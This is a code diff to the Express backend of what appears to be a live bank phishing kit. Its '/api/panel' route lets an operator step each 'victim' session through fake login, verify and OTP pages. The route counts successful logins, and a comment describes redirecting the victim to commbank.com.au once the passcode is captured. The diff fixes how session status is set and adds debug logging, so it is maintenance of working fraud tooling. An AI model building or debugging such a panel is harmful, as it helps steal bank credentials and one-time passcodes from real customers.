@@ -501,6 +501,8 @@ app.post('/api/panel', async (req, res) => {
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
 
+  console.log(`[DEBUG] Panel action: ${action}, sid: ${sid}, current page: ${v.page}, current status: ${v.status}`);
+
   switch (action) {
     case 'redo':
       if (v.page === 'index.html') {
@@ -513,25 +515,37 @@ app.post('/api/panel', async (req, res) => {
       }
       break;
     case 'cont':
-      v.status = 'ok';
-      if (v.page === 'index.html') v.page = 'verify.html';
-      else if (v.page === 'verify.html') {
-        // When admin clicks continue on verify.html (OTP page), redirect victim to commbank.com.au
-        v.page = 'success';
-        v.status = 'approved';
-        successfulLogins++;
+      // FIXED: Handle each page type separately without setting status at the beginning
+      if (v.page === 'index.html') {
+        v.status = 'ok';
+        v.page = 'verify.html';
+        console.log(`[DEBUG] Continue from index.html -> verify.html, status: ok`);
       }
-      else if (v.page === 'unregister.html') v.page = 'verify.html'; // Go to verify.html instead of otp.html
+      else if (v.page === 'verify.html') {
+        // When admin clicks continue on verify.html (OTP page), set status to 'ok' for redirect
+        v.status = 'ok';
+        v.page = 'success';
+        successfulLogins++;
+        console.log(`[DEBUG] Continue from verify.html -> success, status: ok`);
+      }
+      else if (v.page === 'unregister.html') {
+        v.status = 'ok';
+        v.page = 'verify.html';
+        console.log(`[DEBUG] Continue from unregister.html -> verify.html, status: ok`);
+      }
       else if (v.page === 'otp.html') { 
+        v.status = 'ok';
         v.page = 'success'; 
-        v.status = 'approved';
-        successfulLogins++; 
+        successfulLogins++;
+        console.log(`[DEBUG] Continue from otp.html -> success, status: ok`);
       }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
       break;
   }
+  
+  console.log(`[DEBUG] After action: page=${v.page}, status=${v.status}`);
   res.json({ ok: true });
 });
 
